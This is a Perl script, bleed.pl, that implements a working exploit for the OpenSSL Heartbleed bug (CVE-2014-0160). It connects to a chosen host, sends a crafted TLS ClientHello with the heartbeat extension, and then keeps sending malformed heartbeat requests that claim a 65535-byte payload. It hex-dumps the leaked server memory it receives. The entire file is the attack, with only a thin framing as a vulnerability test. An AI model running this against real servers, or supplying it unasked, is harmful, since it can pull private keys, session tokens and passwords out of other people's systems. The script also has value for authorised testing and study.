#!/usr/bin/env perl
# bleed.pl -- CVE-2014-0160
# Pretty much a direct translation of Justin Stafford's ssltest.py

use warnings;
use strict;

use autodie;

use Data::HexDump;
use POE qw/Component::Client::TCP Filter::Block/;

my $host = shift || 'localhost';
my $port = shift || 443;

# Comments from https://gist.github.com/takeshixx/10107280
my $helo =
	# TLS header (5 bytes)
	"\x16" .            # Content type (0x16 for handshake)
	"\x03\x02" .        # TLS Version
	"\x00\xdc" .        # Length

	# Handshake header
	"\x01" .            # Type (0x01 for ClientHello)
	"\x00\x00\xd8" .    # Length
	"\x03\x02" .        # TLS version

	# Random 32 bytes
	"\x53\x43\x5b\x90\x9d\x9b\x72\x0b" .
	"\xbc\x0c\xbc\x2b\x92\xa8\x48\x97" .
	"\xcf\xbd\x39\x04\xcc\x16\x0a\x85" .
	"\x03\x90\x9f\x77\x04\x33\xd4\xde" .

	"\x00" .            # Session ID length
	"\x00\x66" .        # Cipher suites length

	# Cipher suites (51 suites)
	"\xc0\x14\xc0\x0a\xc0\x22\xc0\x21" .
	"\x00\x39\x00\x38\x00\x88\x00\x87" .
	"\xc0\x0f\xc0\x05\x00\x35\x00\x84" .
	"\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b" .
	"\x00\x16\x00\x13\xc0\x0d\xc0\x03" .
	"\x00\x0a\xc0\x13\xc0\x09\xc0\x1f" .
	"\xc0\x1e\x00\x33\x00\x32\x00\x9a" .
	"\x00\x99\x00\x45\x00\x44\xc0\x0e" .
	"\xc0\x04\x00\x2f\x00\x96\x00\x41" .
	"\xc0\x11\xc0\x07\xc0\x0c\xc0\x02" .
	"\x00\x05\x00\x04\x00\x15\x00\x12" .
	"\x00\x09\x00\x14\x00\x11\x00\x08" .
	"\x00\x06\x00\x03\x00\xff" .

	"\x01" .        # Compression methods length
	"\x00" .        # Compression method (0x00 for NULL)

	"\x00\x49" .    # Extensions length

	# Extension: ec_point_formats
	"\x00\x0b\x00\x04\x03\x00\x01\x02" .

	# Extension: elliptic_curves
	"\x00\x0a\x00\x34\x00\x32\x00\x0e" .
	"\x00\x0d\x00\x19\x00\x0b\x00\x0c" .
	"\x00\x18\x00\x09\x00\x0a\x00\x16" .
	"\x00\x17\x00\x08\x00\x06\x00\x07" .
	"\x00\x14\x00\x15\x00\x04\x00\x05" .
	"\x00\x12\x00\x13\x00\x01\x00\x02" .
	"\x00\x03\x00\x0f\x00\x10\x00\x11" .

	# Extension: SessionTicket TLS
	"\x00\x23\x00\x00" .

	# Extension: Heartbeat
	"\x00\x0f\x00\x01\x01";

my $hb =
	"\x18" .      # Heartbeat packet
	"\x03\x02" .  # TLS version
	"\x00\x03" .  # Remaining packet length
	"\x01" .      # Heartbeat request
	"\xff\xff";   # Heartbeat length

sub unpack_block {
	my ($block) = @_;
	return if length($block) < 5;

	my $hdr = substr($block, 0, 5);
	my ($type, $ver, $len) = unpack "Cnn", $hdr;

	my $rst = substr($block, 5);
	return if $len > length($rst);

	my $pay = substr($rst, 0, $len);

	return ($type, $ver, $pay);
}

POE::Component::Client::TCP->new(
	RemoteAddress => $host,
	RemotePort    => $port,
	Filter        => [
		'POE::Filter::Block',
		LengthCodec => [
			# encoder
			sub {},
			# decoder
			sub {
				my ($block) = @_;
				my ($type, $ver, $pay) = unpack_block($$block);
				if ($pay) {
					printf "  type: %d, ver: 0x%04x, len: 0x%04x\n", $type, $ver, length($pay);
					return length($pay) + 5;
				}
				return;
			}
		]
	],

	ConnectError  => sub {
		my ($kernel, $op, $errno, $errstr) = @_[KERNEL, ARG0..ARG2];
		warn "$op error $errno occurred: $errstr\n";
		$kernel->yield('shutdown');
	},
	ServerError   => sub {
		my ($kernel, $op, $errno, $errstr) = @_[KERNEL, ARG0..ARG2];
		warn "$op error $errno occurred: $errstr\n";
		$kernel->yield('shutdown');
	},

	Connected     => sub {
		my $heap = $_[HEAP];
		$heap->{wait_for_hello} = 1;
		$heap->{heartbeats} = 0;
		$heap->{bytes_rcvd} = 0;

		print "Sending client hello...\n";
		$heap->{server}->put($helo);
	},
	ServerInput   => sub {
		my ($kernel, $heap, $input) = @_[KERNEL, HEAP, ARG0];
		my ($type, undef, $pay) = unpack_block($input);

		if ($heap->{wait_for_hello}) {
			if (($type == 22) and ($pay =~ /^\x0e/)) {
				print "Got server hello! Sending heartbeats...\n";
				$heap->{wait_for_hello} = 0;
				$heap->{server}->put($hb);
			}
		} else {
			if ($type == 21) {
				print "Server returned error, likely not vulnerable\n";
				$kernel->yield('shutdown');
			} elsif ($type == 24) {
				$heap->{heartbeats} += 1;
				$heap->{bytes_rcvd} += length($pay);

				print "Received heartbeat response...\n";
				printf "  Server returned more data than it should've (%d bytes), probably vulnerable...\n", length($pay)
					if length($pay) > 3;
				print HexDump($pay);
			}

			# TODO sometimes we don't get exactly 0xffff bytes back. guess
			# there's some extra fluff that I haven't researched about enough
			# yet, so just keep sending heartbeats, even when we haven't read
			# the entire response from the previous request yet.
			#if (($heap->{bytes_rcvd} & 0xffff) == 0) {
			#	print "Sending heartbeat...\n";
				$heap->{server}->put($hb);
			#}
		}
	},
);
POE::Kernel->run;
